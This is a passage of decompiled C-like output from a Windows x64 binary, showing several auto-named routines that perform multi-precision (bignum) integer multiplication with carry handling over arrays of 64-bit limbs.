  v269 = v265 + v268;
  *((_QWORD *)&v268 + 1) += v265 + (unsigned __int64)v268 < v265;
  v270 = *((_QWORD *)&v268 + 1) + v266;
  v271 = (v270 < *((_QWORD *)&v268 + 1)) + v267;
  v272 = v3[4] * (unsigned __int128)v4[7];
  v273 = v269 + v272;
  *((_QWORD *)&v272 + 1) += v269 + (unsigned __int64)v272 < v269;
  v274 = *((_QWORD *)&v272 + 1) + v270;
  v275 = (v274 < *((_QWORD *)&v272 + 1)) + v271;
  v276 = v3[5] * (unsigned __int128)v4[6];
  v277 = v273 + v276;
  *((_QWORD *)&v276 + 1) += v273 + (unsigned __int64)v276 < v273;
  v278 = *((_QWORD *)&v276 + 1) + v274;
  v279 = (v278 < *((_QWORD *)&v276 + 1)) + v275;
  v280 = v3[6] * (unsigned __int128)v4[5];
  v281 = v277 + v280;
  *((_QWORD *)&v280 + 1) += v277 + (unsigned __int64)v280 < v277;
  v282 = *((_QWORD *)&v280 + 1) + v278;
  v283 = (v282 < *((_QWORD *)&v280 + 1)) + v279;
  v284 = v3[7] * (unsigned __int128)v4[4];
  v285 = v281 + v284;
  *((_QWORD *)&v284 + 1) += v281 + (unsigned __int64)v284 < v281;
  v286 = *((_QWORD *)&v284 + 1) + v282;
  v287 = (v286 < *((_QWORD *)&v284 + 1)) + v283;
  v288 = v3[8] * (unsigned __int128)v4[3];
  v289 = v285 + v288;
  *((_QWORD *)&v288 + 1) += v285 + (unsigned __int64)v288 < v285;
  v290 = *((_QWORD *)&v288 + 1) + v286;
  v291 = (v290 < *((_QWORD *)&v288 + 1)) + v287;
  v292 = v3[9] * (unsigned __int128)v4[2];
  v293 = v289 + v292;
  *((_QWORD *)&v292 + 1) += v289 + (unsigned __int64)v292 < v289;
  v294 = *((_QWORD *)&v292 + 1) + v290;
  v295 = (v294 < *((_QWORD *)&v292 + 1)) + v291;
  v296 = v3[10] * (unsigned __int128)v4[1];
  v297 = v293 + v296;
  *((_QWORD *)&v296 + 1) += v293 + (unsigned __int64)v296 < v293;
  v298 = *((_QWORD *)&v296 + 1) + v294;
  v299 = (v298 < *((_QWORD *)&v296 + 1)) + v295;
  v300 = v3[11] * (unsigned __int128)*v4;
  *(_QWORD *)&v300 = v297 + v300;
  v5[11] = v300;
  *((_QWORD *)&v300 + 1) += (unsigned __int64)v300 < v297;
  v301 = *((_QWORD *)&v300 + 1) + v298;
  v302 = (v301 < *((_QWORD *)&v300 + 1)) + v299;
  v303 = *v3 * (unsigned __int128)v4[12];
  v304 = v301 + v303;
  *((_QWORD *)&v303 + 1) += v301 + (unsigned __int64)v303 < v301;
  v305 = *((_QWORD *)&v303 + 1) + v302;
  v306 = v305 < *((_QWORD *)&v303 + 1);
  v307 = v3[1] * (unsigned __int128)v4[11];
  v308 = v304 + v307;
  *((_QWORD *)&v307 + 1) += v304 + (unsigned __int64)v307 < v304;
  v309 = *((_QWORD *)&v307 + 1) + v305;
  v310 = (v309 < *((_QWORD *)&v307 + 1)) + v306;
  v311 = v3[2] * (unsigned __int128)v4[10];
  v312 = v308 + v311;
  *((_QWORD *)&v311 + 1) += v308 + (unsigned __int64)v311 < v308;
  v313 = *((_QWORD *)&v311 + 1) + v309;
  v314 = (v313 < *((_QWORD *)&v311 + 1)) + v310;
  v315 = v3[3] * (unsigned __int128)v4[9];
  v316 = v312 + v315;
  *((_QWORD *)&v315 + 1) += v312 + (unsigned __int64)v315 < v312;
  v317 = *((_QWORD *)&v315 + 1) + v313;
  v318 = (v317 < *((_QWORD *)&v315 + 1)) + v314;
  v319 = v3[4] * (unsigned __int128)v4[8];
  v320 = v316 + v319;
  *((_QWORD *)&v319 + 1) += v316 + (unsigned __int64)v319 < v316;
  v321 = *((_QWORD *)&v319 + 1) + v317;
  v322 = (v321 < *((_QWORD *)&v319 + 1)) + v318;
  v323 = v3[5] * (unsigned __int128)v4[7];
  v324 = v320 + v323;
  *((_QWORD *)&v323 + 1) += v320 + (unsigned __int64)v323 < v320;
  v325 = *((_QWORD *)&v323 + 1) + v321;
  v326 = (v325 < *((_QWORD *)&v323 + 1)) + v322;
  v327 = v3[6] * (unsigned __int128)v4[6];
  v328 = v324 + v327;
  *((_QWORD *)&v327 + 1) += v324 + (unsigned __int64)v327 < v324;
  v329 = *((_QWORD *)&v327 + 1) + v325;
  v330 = (v329 < *((_QWORD *)&v327 + 1)) + v326;
  v331 = v3[7] * (unsigned __int128)v4[5];
  v332 = v328 + v331;
  *((_QWORD *)&v331 + 1) += v328 + (unsigned __int64)v331 < v328;
  v333 = *((_QWORD *)&v331 + 1) + v329;
  v334 = (v333 < *((_QWORD *)&v331 + 1)) + v330;
  v335 = v3[8] * (unsigned __int128)v4[4];
  v336 = v332 + v335;
  *((_QWORD *)&v335 + 1) += v332 + (unsigned __int64)v335 < v332;
  v337 = *((_QWORD *)&v335 + 1) + v333;
  v338 = (v337 < *((_QWORD *)&v335 + 1)) + v334;
  v339 = v3[9] * (unsigned __int128)v4[3];
  v340 = v336 + v339;
  *((_QWORD *)&v339 + 1) += v336 + (unsigned __int64)v339 < v336;
  v341 = *((_QWORD *)&v339 + 1) + v337;
  v342 = (v341 < *((_QWORD *)&v339 + 1)) + v338;
  v343 = v3[10] * (unsigned __int128)v4[2];
  v344 = v340 + v343;
  *((_QWORD *)&v343 + 1) += v340 + (unsigned __int64)v343 < v340;
  v345 = *((_QWORD *)&v343 + 1) + v341;
  v346 = (v345 < *((_QWORD *)&v343 + 1)) + v342;
  v347 = v3[11] * (unsigned __int128)v4[1];
  v348 = v344 + v347;
  *((_QWORD *)&v347 + 1) += v344 + (unsigned __int64)v347 < v344;
  v349 = *((_QWORD *)&v347 + 1) + v345;
  v350 = (v349 < *((_QWORD *)&v347 + 1)) + v346;
  v351 = v3[12] * (unsigned __int128)*v4;
  *(_QWORD *)&v351 = v348 + v351;
  v5[12] = v351;
  *((_QWORD *)&v351 + 1) += (unsigned __int64)v351 < v348;
  v352 = *((_QWORD *)&v351 + 1) + v349;
  v353 = (v352 < *((_QWORD *)&v351 + 1)) + v350;
  v354 = *v3 * (unsigned __int128)v4[13];
  v355 = v352 + v354;
  *((_QWORD *)&v354 + 1) += v352 + (unsigned __int64)v354 < v352;
  v356 = *((_QWORD *)&v354 + 1) + v353;
  v357 = v356 < *((_QWORD *)&v354 + 1);
  v358 = v3[1] * (unsigned __int128)v4[12];
  v359 = v355 + v358;
  *((_QWORD *)&v358 + 1) += v355 + (unsigned __int64)v358 < v355;
  v360 = *((_QWORD *)&v358 + 1) + v356;
  v361 = (v360 < *((_QWORD *)&v358 + 1)) + v357;
  v362 = v3[2] * (unsigned __int128)v4[11];
  v363 = v359 + v362;
  *((_QWORD *)&v362 + 1) += v359 + (unsigned __int64)v362 < v359;
  v364 = *((_QWORD *)&v362 + 1) + v360;
  v365 = (v364 < *((_QWORD *)&v362 + 1)) + v361;
  v366 = v3[3] * (unsigned __int128)v4[10];
  v367 = v363 + v366;
  *((_QWORD *)&v366 + 1) += v363 + (unsigned __int64)v366 < v363;
  v368 = *((_QWORD *)&v366 + 1) + v364;
  v369 = (v368 < *((_QWORD *)&v366 + 1)) + v365;
  v370 = v3[4] * (unsigned __int128)v4[9];
  v371 = v367 + v370;
  *((_QWORD *)&v370 + 1) += v367 + (unsigned __int64)v370 < v367;
  v372 = *((_QWORD *)&v370 + 1) + v368;
  v373 = (v372 < *((_QWORD *)&v370 + 1)) + v369;
  v374 = v3[5] * (unsigned __int128)v4[8];
  v375 = v371 + v374;
  *((_QWORD *)&v374 + 1) += v371 + (unsigned __int64)v374 < v371;
  v376 = *((_QWORD *)&v374 + 1) + v372;
  v377 = (v376 < *((_QWORD *)&v374 + 1)) + v373;
  v378 = v3[6] * (unsigned __int128)v4[7];
  v379 = v375 + v378;
  *((_QWORD *)&v378 + 1) += v375 + (unsigned __int64)v378 < v375;
  v380 = *((_QWORD *)&v378 + 1) + v376;
  v381 = (v380 < *((_QWORD *)&v378 + 1)) + v377;
  v382 = v3[7] * (unsigned __int128)v4[6];
  v383 = v379 + v382;
  *((_QWORD *)&v382 + 1) += v379 + (unsigned __int64)v382 < v379;
  v384 = *((_QWORD *)&v382 + 1) + v380;
  v385 = (v384 < *((_QWORD *)&v382 + 1)) + v381;
  v386 = v3[8] * (unsigned __int128)v4[5];
  v387 = v383 + v386;
  *((_QWORD *)&v386 + 1) += v383 + (unsigned __int64)v386 < v383;
  v388 = *((_QWORD *)&v386 + 1) + v384;
  v389 = (v388 < *((_QWORD *)&v386 + 1)) + v385;
  v390 = v3[9] * (unsigned __int128)v4[4];
  v391 = v387 + v390;
  *((_QWORD *)&v390 + 1) += v387 + (unsigned __int64)v390 < v387;
  v392 = *((_QWORD *)&v390 + 1) + v388;
  v393 = (v392 < *((_QWORD *)&v390 + 1)) + v389;
  v394 = v3[10] * (unsigned __int128)v4[3];
  v395 = v391 + v394;
  *((_QWORD *)&v394 + 1) += v391 + (unsigned __int64)v394 < v391;
  v396 = *((_QWORD *)&v394 + 1) + v392;
  v397 = (v396 < *((_QWORD *)&v394 + 1)) + v393;
  v398 = v3[11] * (unsigned __int128)v4[2];
  v399 = v395 + v398;
  *((_QWORD *)&v398 + 1) += v395 + (unsigned __int64)v398 < v395;
  v400 = *((_QWORD *)&v398 + 1) + v396;
  v401 = (v400 < *((_QWORD *)&v398 + 1)) + v397;
  v402 = v3[12] * (unsigned __int128)v4[1];
  v403 = v399 + v402;
  *((_QWORD *)&v402 + 1) += v399 + (unsigned __int64)v402 < v399;
  v404 = *((_QWORD *)&v402 + 1) + v400;
  v405 = (v404 < *((_QWORD *)&v402 + 1)) + v401;
  v406 = v3[13] * (unsigned __int128)*v4;
  *(_QWORD *)&v406 = v403 + v406;
  v5[13] = v406;
  *((_QWORD *)&v406 + 1) += (unsigned __int64)v406 < v403;
  v407 = *((_QWORD *)&v406 + 1) + v404;
  v408 = (v407 < *((_QWORD *)&v406 + 1)) + v405;
  v409 = *v3 * (unsigned __int128)v4[14];
  v410 = v407 + v409;
  v411 = (v407 + (unsigned __int64)v409 < v407) + *((_QWORD *)&v409 + 1) + v408;
  v412 = v3[1] * (unsigned __int128)v4[13];
  v413 = v410 + v412;
  v414 = (v410 + (unsigned __int64)v412 < v410) + *((_QWORD *)&v412 + 1) + v411;
  v415 = v3[2] * (unsigned __int128)v4[12];
  v416 = v413 + v415;
  v417 = (v413 + (unsigned __int64)v415 < v413) + *((_QWORD *)&v415 + 1) + v414;
  v418 = v3[3] * (unsigned __int128)v4[11];
  v419 = v416 + v418;
  v420 = (v416 + (unsigned __int64)v418 < v416) + *((_QWORD *)&v418 + 1) + v417;
  v421 = v3[4] * (unsigned __int128)v4[10];
  v422 = v419 + v421;
  v423 = (v419 + (unsigned __int64)v421 < v419) + *((_QWORD *)&v421 + 1) + v420;
  v424 = v3[5] * (unsigned __int128)v4[9];
  v425 = v422 + v424;
  v426 = (v422 + (unsigned __int64)v424 < v422) + *((_QWORD *)&v424 + 1) + v423;
  v427 = v3[6] * (unsigned __int128)v4[8];
  v428 = v425 + v427;
  v429 = (v425 + (unsigned __int64)v427 < v425) + *((_QWORD *)&v427 + 1) + v426;
  v430 = v3[7] * (unsigned __int128)v4[7];
  v431 = v428 + v430;
  v432 = (v428 + (unsigned __int64)v430 < v428) + *((_QWORD *)&v430 + 1) + v429;
  v433 = v3[8] * (unsigned __int128)v4[6];
  v434 = v431 + v433;
  v435 = (v431 + (unsigned __int64)v433 < v431) + *((_QWORD *)&v433 + 1) + v432;
  v436 = v3[9] * (unsigned __int128)v4[5];
  v437 = v434 + v436;
  v438 = (v434 + (unsigned __int64)v436 < v434) + *((_QWORD *)&v436 + 1) + v435;
  v439 = v3[10] * (unsigned __int128)v4[4];
  v440 = v437 + v439;
  v441 = (v437 + (unsigned __int64)v439 < v437) + *((_QWORD *)&v439 + 1) + v438;
  v442 = v3[11] * (unsigned __int128)v4[3];
  v443 = v440 + v442;
  v444 = (v440 + (unsigned __int64)v442 < v440) + *((_QWORD *)&v442 + 1) + v441;
  v445 = v3[12] * (unsigned __int128)v4[2];
  v446 = v443 + v445;
  v447 = (v443 + (unsigned __int64)v445 < v443) + *((_QWORD *)&v445 + 1) + v444;
  v448 = v3[13] * (unsigned __int128)v4[1];
  v449 = v446 + v448;
  v450 = (v446 + (unsigned __int64)v448 < v446) + *((_QWORD *)&v448 + 1) + v447;
  v451 = v3[14] * (unsigned __int128)*v4;
  *(_QWORD *)&v451 = v449 + v451;
  v5[14] = v451;
  result = ((unsigned __int64)v451 < v449)
         + *((_QWORD *)&v451 + 1)
         + v3[12] * v4[3]
         + v3[11] * v4[4]
         + v3[10] * v4[5]
         + v3[9] * v4[6]
         + v3[8] * v4[7]
         + v3[7] * v4[8]
         + v3[1] * v4[14]
         + v3[2] * v4[13]
         + v3[3] * v4[12]
         + v3[4] * v4[11]
         + v3[5] * v4[10]
         + v3[6] * v4[9]
         + *v4 * v3[15]
         + *v3 * v4[15]
         + v450
         + v3[13] * v4[2]
         + v4[1] * v3[14];
  v5[15] = result;
  return result;
}

//----- (0000000140041E80) ----------------------------------------------------
__int64 __fastcall sub_140041E80(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  unsigned __int64 v3; // kr00_8
  __int128 v4; // kr10_16
  __int64 result; // rax

  v3 = *a3;
  v4 = *a2;
  *a1 = *a2 * *a3;
  result = __PAIR__(a3[1], v3) * v4 >> 64;
  a1[1] = result + *a3 * a2[1];
  return result;
}

//----- (0000000140041EB0) ----------------------------------------------------
unsigned __int64 __fastcall sub_140041EB0(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  unsigned __int64 *v3; // r11
  unsigned __int64 *v4; // rbx
  _QWORD *v5; // rdi
  __int128 v6; // kr00_16
  __int128 v7; // kr10_16
  __int64 v8; // r10
  unsigned __int64 v9; // r8
  unsigned __int128 v10; // ax
  unsigned __int64 v11; // r10
  _BOOL8 v12; // r9
  unsigned __int128 v13; // ax
  unsigned __int64 v14; // rcx
  __int64 v15; // r9
  unsigned __int128 v16; // ax
  unsigned __int64 v17; // r8
  __int64 v18; // r9
  unsigned __int128 v19; // ax
  unsigned __int64 result; // rax

  v3 = a2;
  v4 = a3;
  v5 = a1;
  v6 = *a3;
  v7 = *a2;
  *a1 = *a2 * *a3;
  v8 = *a2 * (unsigned __int128)a3[1] >> 64;
  v9 = __PAIR__(a3[1], (unsigned __int64)v6) * v7 >> 64;
  v10 = a2[1] * (unsigned __int128)*v4;
  *(_QWORD *)&v10 = v9 + v10;
  a1[1] = v10;
  *((_QWORD *)&v10 + 1) += (unsigned __int64)v10 < v9;
  v11 = *((_QWORD *)&v10 + 1) + (v9 < (unsigned __int128)(v7 * v6) >> 64) + v8;
  v12 = v11 < *((_QWORD *)&v10 + 1);
  v13 = v3[2] * (unsigned __int128)*v4;
  v14 = v11 + v13;
  v15 = (v11 + (unsigned __int64)v13 < v11) + *((_QWORD *)&v13 + 1) + v12;
  v16 = v3[1] * (unsigned __int128)v4[1];
  v17 = v14 + v16;
  v18 = (v14 + (unsigned __int64)v16 < v14) + *((_QWORD *)&v16 + 1) + v15;
  v19 = *v3 * (unsigned __int128)v4[2];
  *(_QWORD *)&v19 = v17 + v19;
  v5[2] = v19;
  result = ((unsigned __int64)v19 < v17)
         + *((_QWORD *)&v19 + 1)
         + *v4 * v3[3]
         + *v3 * v4[3]
         + v18
         + v3[1] * v4[2]
         + v4[1] * v3[2];
  v5[3] = result;
  return result;
}

//----- (0000000140041F90) ----------------------------------------------------
unsigned __int64 __fastcall sub_140041F90(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  unsigned __int64 *v3; // rbx
  unsigned __int64 *v4; // rdi
  _QWORD *v5; // rsi
  __int128 v6; // kr00_16
  __int128 v7; // kr10_16
  __int64 v8; // r10
  unsigned __int64 v9; // r8
  unsigned __int128 v10; // ax
  unsigned __int64 v11; // r10
  _BOOL8 v12; // r9
  unsigned __int128 v13; // ax
  unsigned __int64 v14; // rcx
  unsigned __int64 v15; // r9
  _BOOL8 v16; // r10
  unsigned __int128 v17; // ax
  unsigned __int64 v18; // r8
  unsigned __int64 v19; // r9
  _BOOL8 v20; // r10
  unsigned __int128 v21; // ax
  unsigned __int64 v22; // r9
  _BOOL8 v23; // r10
  unsigned __int128 v24; // ax
  unsigned __int64 v25; // rcx
  unsigned __int64 v26; // r10
  _BOOL8 v27; // r9
  unsigned __int128 v28; // ax
  unsigned __int64 v29; // r8
  unsigned __int64 v30; // r10
  _BOOL8 v31; // r9
  unsigned __int128 v32; // ax
  unsigned __int64 v33; // rcx
  unsigned __int64 v34; // r10
  _BOOL8 v35; // r9
  unsigned __int128 v36; // ax
  unsigned __int64 v37; // r10
  _BOOL8 v38; // r9
  unsigned __int128 v39; // ax
  unsigned __int64 v40; // rcx
  unsigned __int64 v41; // r9
  _BOOL8 v42; // r10
  unsigned __int128 v43; // ax
  unsigned __int64 v44; // r8
  unsigned __int64 v45; // r9
  _BOOL8 v46; // r10
  unsigned __int128 v47; // ax
  unsigned __int64 v48; // rcx
  unsigned __int64 v49; // r9
  _BOOL8 v50; // r10
  unsigned __int128 v51; // ax
  unsigned __int64 v52; // r8
  unsigned __int64 v53; // r9
  _BOOL8 v54; // r10
  unsigned __int128 v55; // ax
  unsigned __int64 v56; // r9
  __int64 v57; // r10
  unsigned __int128 v58; // ax
  unsigned __int64 v59; // rcx
  unsigned __int64 v60; // r10
  _BOOL8 v61; // r11
  unsigned __int128 v62; // ax
  unsigned __int64 v63; // r8
  unsigned __int64 v64; // r10
  _BOOL8 v65; // r11
  unsigned __int128 v66; // ax
  unsigned __int64 v67; // rcx
  unsigned __int64 v68; // r10
  _BOOL8 v69; // r11
  unsigned __int128 v70; // ax
  unsigned __int64 v71; // r8
  unsigned __int64 v72; // r10
  _BOOL8 v73; // r11
  unsigned __int128 v74; // ax
  unsigned __int64 v75; // rcx
  unsigned __int64 v76; // r10
  __int64 v77; // r11
  unsigned __int128 v78; // ax
  unsigned __int64 v79; // r10
  __int64 v80; // r11
  unsigned __int128 v81; // ax
  unsigned __int64 v82; // rcx
  __int64 v83; // r11
  unsigned __int128 v84; // ax
  unsigned __int64 v85; // r8
  __int64 v86; // r11
  unsigned __int128 v87; // ax
  unsigned __int64 v88; // rcx
  __int64 v89; // r11
  unsigned __int128 v90; // ax
  unsigned __int64 v91; // r8
  __int64 v92; // r11
  unsigned __int128 v93; // ax
  unsigned __int64 v94; // rcx
  __int64 v95; // r11
  unsigned __int128 v96; // ax
  unsigned __int64 v97; // r8
  __int64 v98; // r11
  unsigned __int128 v99; // ax
  unsigned __int64 result; // rax

  v3 = a2;
  v4 = a3;
  v5 = a1;
  v6 = *a3;
  v7 = *a2;
  *a1 = *a2 * *a3;
  v8 = *a2 * (unsigned __int128)a3[1] >> 64;
  v9 = __PAIR__(a3[1], (unsigned __int64)v6) * v7 >> 64;
  v10 = a2[1] * (unsigned __int128)*v4;
  *(_QWORD *)&v10 = v9 + v10;
  a1[1] = v10;
  *((_QWORD *)&v10 + 1) += (unsigned __int64)v10 < v9;
  v11 = *((_QWORD *)&v10 + 1) + (v9 < (unsigned __int128)(v7 * v6) >> 64) + v8;
  v12 = v11 < *((_QWORD *)&v10 + 1);
  v13 = *v3 * (unsigned __int128)v4[2];
  v14 = v11 + v13;
  *((_QWORD *)&v13 + 1) += v11 + (unsigned __int64)v13 < v11;
  v15 = *((_QWORD *)&v13 + 1) + v12;
  v16 = v15 < *((_QWORD *)&v13 + 1);
  v17 = v3[1] * (unsigned __int128)v4[1];
  v18 = v14 + v17;
  *((_QWORD *)&v17 + 1) += v14 + (unsigned __int64)v17 < v14;
  v19 = *((_QWORD *)&v17 + 1) + v15;
  v20 = (v19 < *((_QWORD *)&v17 + 1)) + v16;
  v21 = v3[2] * (unsigned __int128)*v4;
  *(_QWORD *)&v21 = v18 + v21;
  v5[2] = v21;
  *((_QWORD *)&v21 + 1) += (unsigned __int64)v21 < v18;
  v22 = *((_QWORD *)&v21 + 1) + v19;
  v23 = (v22 < *((_QWORD *)&v21 + 1)) + v20;
  v24 = *v3 * (unsigned __int128)v4[3];
  v25 = v22 + v24;
  *((_QWORD *)&v24 + 1) += v22 + (unsigned __int64)v24 < v22;
  v26 = *((_QWORD *)&v24 + 1) + v23;
  v27 = v26 < *((_QWORD *)&v24 + 1);
  v28 = v3[1] * (unsigned __int128)v4[2];
  v29 = v25 + v28;
  *((_QWORD *)&v28 + 1) += v25 + (unsigned __int64)v28 < v25;
  v30 = *((_QWORD *)&v28 + 1) + v26;
  v31 = (v30 < *((_QWORD *)&v28 + 1)) + v27;
  v32 = v3[2] * (unsigned __int128)v4[1];
  v33 = v29 + v32;
  *((_QWORD *)&v32 + 1) += v29 + (unsigned __int64)v32 < v29;
  v34 = *((_QWORD *)&v32 + 1) + v30;
  v35 = (v34 < *((_QWORD *)&v32 + 1)) + v31;
  v36 = v3[3] * (unsigned __int128)*v4;
  *(_QWORD *)&v36 = v33 + v36;
  *((_QWORD *)&v36 + 1) += (unsigned __int64)v36 < v33;
  v37 = *((_QWORD *)&v36 + 1) + v34;
  v5[3] = v36;
  v38 = (v37 < *((_QWORD *)&v36 + 1)) + v35;
  v39 = *v3 * (unsigned __int128)v4[4];
  v40 = v37 + v39;
  *((_QWORD *)&v39 + 1) += v37 + (unsigned __int64)v39 < v37;
  v41 = *((_QWORD *)&v39 + 1) + v38;
  v42 = v41 < *((_QWORD *)&v39 + 1);
  v43 = v3[1] * (unsigned __int128)v4[3];
  v44 = v40 + v43;
  *((_QWORD *)&v43 + 1) += v40 + (unsigned __int64)v43 < v40;
  v45 = *((_QWORD *)&v43 + 1) + v41;
  v46 = (v45 < *((_QWORD *)&v43 + 1)) + v42;
  v47 = v3[2] * (unsigned __int128)v4[2];
  v48 = v44 + v47;
  *((_QWORD *)&v47 + 1) += v44 + (unsigned __int64)v47 < v44;
  v49 = *((_QWORD *)&v47 + 1) + v45;
  v50 = (v49 < *((_QWORD *)&v47 + 1)) + v46;
  v51 = v3[3] * (unsigned __int128)v4[1];
  v52 = v48 + v51;
  *((_QWORD *)&v51 + 1) += v48 + (unsigned __int64)v51 < v48;
  v53 = *((_QWORD *)&v51 + 1) + v49;
  v54 = (v53 < *((_QWORD *)&v51 + 1)) + v50;
  v55 = v3[4] * (unsigned __int128)*v4;
  *(_QWORD *)&v55 = v52 + v55;
  v5[4] = v55;
  *((_QWORD *)&v55 + 1) += (unsigned __int64)v55 < v52;
  v56 = *((_QWORD *)&v55 + 1) + v53;
  v57 = (v56 < *((_QWORD *)&v55 + 1)) + v54;
  v58 = *v3 * (unsigned __int128)v4[5];
  v59 = v56 + v58;
  *((_QWORD *)&v58 + 1) += v56 + (unsigned __int64)v58 < v56;
  v60 = *((_QWORD *)&v58 + 1) + v57;
  v61 = v60 < *((_QWORD *)&v58 + 1);
  v62 = v3[1] * (unsigned __int128)v4[4];
  v63 = v59 + v62;
  *((_QWORD *)&v62 + 1) += v59 + (unsigned __int64)v62 < v59;
  v64 = *((_QWORD *)&v62 + 1) + v60;
  v65 = (v64 < *((_QWORD *)&v62 + 1)) + v61;
  v66 = v3[2] * (unsigned __int128)v4[3];
  v67 = v63 + v66;
  *((_QWORD *)&v66 + 1) += v63 + (unsigned __int64)v66 < v63;
  v68 = *((_QWORD *)&v66 + 1) + v64;
  v69 = (v68 < *((_QWORD *)&v66 + 1)) + v65;
  v70 = v3[3] * (unsigned __int128)v4[2];
  v71 = v67 + v70;
  *((_QWORD *)&v70 + 1) += v67 + (unsigned __int64)v70 < v67;
  v72 = *((_QWORD *)&v70 + 1) + v68;
  v73 = (v72 < *((_QWORD *)&v70 + 1)) + v69;
  v74 = v3[4] * (unsigned __int128)v4[1];
  v75 = v71 + v74;
  *((_QWORD *)&v74 + 1) += v71 + (unsigned __int64)v74 < v71;
  v76 = *((_QWORD *)&v74 + 1) + v72;
  v77 = (v76 < *((_QWORD *)&v74 + 1)) + v73;
  v78 = v3[5] * (unsigned __int128)*v4;
  *(_QWORD *)&v78 = v75 + v78;
  v5[5] = v78;
  *((_QWORD *)&v78 + 1) += (unsigned __int64)v78 < v75;
  v79 = *((_QWORD *)&v78 + 1) + v76;
  v80 = (v79 < *((_QWORD *)&v78 + 1)) + v77;
  v81 = *v3 * (unsigned __int128)v4[6];
  v82 = v79 + v81;
  v83 = (v79 + (unsigned __int64)v81 < v79) + *((_QWORD *)&v81 + 1) + v80;
  v84 = v3[1] * (unsigned __int128)v4[5];
  v85 = v82 + v84;
  v86 = (v82 + (unsigned __int64)v84 < v82) + *((_QWORD *)&v84 + 1) + v83;
  v87 = v3[2] * (unsigned __int128)v4[4];
  v88 = v85 + v87;
  v89 = (v85 + (unsigned __int64)v87 < v85) + *((_QWORD *)&v87 + 1) + v86;
  v90 = v3[3] * (unsigned __int128)v4[3];
  v91 = v88 + v90;
  v92 = (v88 + (unsigned __int64)v90 < v88) + *((_QWORD *)&v90 + 1) + v89;
  v93 = v3[4] * (unsigned __int128)v4[2];
  v94 = v91 + v93;
  v95 = (v91 + (unsigned __int64)v93 < v91) + *((_QWORD *)&v93 + 1) + v92;
  v96 = v3[5] * (unsigned __int128)v4[1];
  v97 = v94 + v96;
  v98 = (v94 + (unsigned __int64)v96 < v94) + *((_QWORD *)&v96 + 1) + v95;
  v99 = v3[6] * (unsigned __int128)*v4;
  *(_QWORD *)&v99 = v97 + v99;
  v5[6] = v99;
  result = ((unsigned __int64)v99 < v97)
         + *((_QWORD *)&v99 + 1)
         + v3[4] * v4[3]
         + v3[3] * v4[4]
         + v3[1] * v4[6]
         + v3[2] * v4[5]
         + *v4 * v3[7]
         + *v3 * v4[7]
         + v98
         + v3[5] * v4[2]
         + v4[1] * v3[6];
  v5[7] = result;
  return result;
}

//----- (0000000140042300) ----------------------------------------------------
unsigned __int64 __fastcall sub_140042300(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // r10
  unsigned __int64 *v5; // rdi
  unsigned __int64 v6; // rbp
  unsigned __int64 v7; // r14
  unsigned __int64 v8; // r12
  unsigned __int64 v9; // r13
  unsigned __int64 *v10; // rbx
  unsigned __int64 v11; // r8
  unsigned __int64 v12; // r15
  unsigned __int64 v13; // r9
  __int64 v14; // r11
  unsigned __int64 v15; // rdx
  unsigned __int64 v16; // r11
  _BOOL8 v17; // rsi
  unsigned __int64 v18; // rdx
  unsigned __int64 v19; // r11
  _BOOL8 v20; // rsi
  unsigned __int64 v21; // rdx
  unsigned __int64 v22; // r11
  _BOOL8 v23; // rsi
  unsigned __int64 v24; // rdx
  unsigned __int64 v25; // r11
  _BOOL8 v26; // rsi
  unsigned __int64 v27; // rdx
  unsigned __int64 v28; // r11
  __int64 v29; // rsi
  unsigned __int64 v30; // rdx
  unsigned __int64 v31; // r11
  __int64 v32; // rsi
  unsigned __int64 v33; // rdx
  unsigned __int64 v34; // r11
  __int64 v35; // rsi
  unsigned __int64 v36; // rdx
  unsigned __int64 v37; // r11
  __int64 v38; // rsi
  unsigned __int64 v39; // rdx
  unsigned __int64 v40; // r11
  __int64 v41; // rsi
  unsigned __int64 v42; // rdx
  unsigned __int64 v43; // r11
  __int64 v44; // rsi
  unsigned __int64 v45; // rdx
  unsigned __int64 v46; // r11
  __int64 v47; // rsi
  unsigned __int64 v48; // rdx
  unsigned __int64 v49; // rax
  unsigned __int64 v50; // rbx
  unsigned __int64 v51; // r11
  __int64 v52; // rsi
  unsigned __int64 v53; // rdx
  unsigned __int64 v54; // r11
  __int64 v55; // rsi
  unsigned __int64 v56; // rdx
  unsigned __int64 v57; // r11
  __int64 v58; // rsi
  unsigned __int128 v59; // ax
  unsigned __int64 v60; // rcx
  unsigned __int64 v61; // rsi
  _BOOL8 v62; // r11
  unsigned __int128 v63; // ax
  unsigned __int64 v64; // r8
  unsigned __int64 v65; // rsi
  _BOOL8 v66; // r11
  unsigned __int128 v67; // ax
  unsigned __int64 v68; // rcx
  unsigned __int64 v69; // rsi
  _BOOL8 v70; // r11
  unsigned __int128 v71; // ax
  unsigned __int64 v72; // r8
  unsigned __int64 v73; // rsi
  _BOOL8 v74; // r11
  unsigned __int128 v75; // ax
  unsigned __int64 v76; // rcx
  unsigned __int64 v77; // rsi
  __int64 v78; // r11
  unsigned __int128 v79; // ax
  unsigned __int64 v80; // r8
  unsigned __int64 v81; // rsi
  __int64 v82; // r11
  unsigned __int128 v83; // ax
  unsigned __int64 v84; // rcx
  unsigned __int64 v85; // rsi
  __int64 v86; // r11
  unsigned __int128 v87; // ax
  unsigned __int64 v88; // r8
  unsigned __int64 v89; // rsi
  __int64 v90; // r11
  unsigned __int128 v91; // ax
  unsigned __int64 v92; // rcx
  unsigned __int64 v93; // rsi
  __int64 v94; // r11
  unsigned __int128 v95; // ax
  unsigned __int64 v96; // r8
  unsigned __int64 v97; // rsi
  __int64 v98; // r11
  unsigned __int128 v99; // ax
  unsigned __int64 v100; // rcx
  unsigned __int64 v101; // rsi
  __int64 v102; // r11
  unsigned __int128 v103; // ax
  unsigned __int64 v104; // r8
  unsigned __int64 v105; // rsi
  __int64 v106; // r11
  unsigned __int128 v107; // ax
  unsigned __int64 v108; // rcx
  unsigned __int64 v109; // rsi
  __int64 v110; // r11
  unsigned __int128 v111; // ax
  unsigned __int64 v112; // r8
  unsigned __int64 v113; // rsi
  __int64 v114; // r11
  unsigned __int128 v115; // ax
  unsigned __int64 v116; // r10
  unsigned __int64 v117; // r9
  unsigned __int64 v118; // rsi
  __int64 v119; // r11
  unsigned __int128 v120; // ax
  unsigned __int64 v121; // rsi
  __int64 v122; // r11
  unsigned __int64 v123; // rsi
